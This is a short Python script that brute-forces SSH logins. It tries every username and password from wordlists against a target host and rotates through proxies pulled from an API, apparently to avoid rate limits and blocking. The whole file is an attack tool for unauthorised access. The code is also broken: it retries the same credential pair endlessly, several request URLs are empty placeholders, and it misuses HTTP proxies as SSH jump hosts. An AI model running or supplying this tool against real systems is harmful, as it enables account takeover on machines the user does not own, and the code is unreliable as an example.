#!/usr/bin/env python3
import requests
import paramiko
from itertools import cycle

class Handler:
    def __init__(self, ip, port):
        self.target_ip = ip
        self.target_port = port
        self.proxy_list = None
        self.proxy_pool = None
        self.reload_proxies()

    def reload_proxies(self):
        self.proxy_list = requests.get('api').text.split()
        self.proxy_pool = cycle(self.proxy_list)

    def get_next_proxy(self):
        proxy = next(self.proxy_pool)
        print(f"Trying proxy: {proxy}")
        try:
            requests.get("", proxies={"http": proxy, "https": proxy}, timeout=5)
            print("Proxy is OK. ")
            return proxy
        except Exception as e:
            print(e)
            print("Proxy offline, trying next one...")
            return self.get_next_proxy()
        
    def connect(self, username, password):
        while True:
            proxy = self.get_next_proxy()
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                sock_proxy = paramiko.ProxyCommand(f'ssh -o StrictHostKeyChecking=no -W %h:%p {proxy}')
                ssh.connect(self.target_ip, self.target_port, username, password, timeout=5, sock=sock_proxy)
                print(f"Successful login found: {username}:{password}")
                break
            except Exception as e:
                print(e)
                print("Connection failed, trying next proxy...")
                continue
    def load_wordlists(self):
        with open("usernames.txt", "r") as f:
            self.usernames = f.read().splitlines()
        with open("passwords.txt", "r") as f:
            self.passwords = f.read().splitlines()
    
    def execute(self):
        for username in self.usernames:
            for password in self.passwords:
                self.connect(username, password)
    
    def run(self):
        self.load_wordlists()
        self.execute()

if __name__ == "__main__":
    ip = ""
    port = 22
    handler = Handler(ip, port)
    handler.run()
    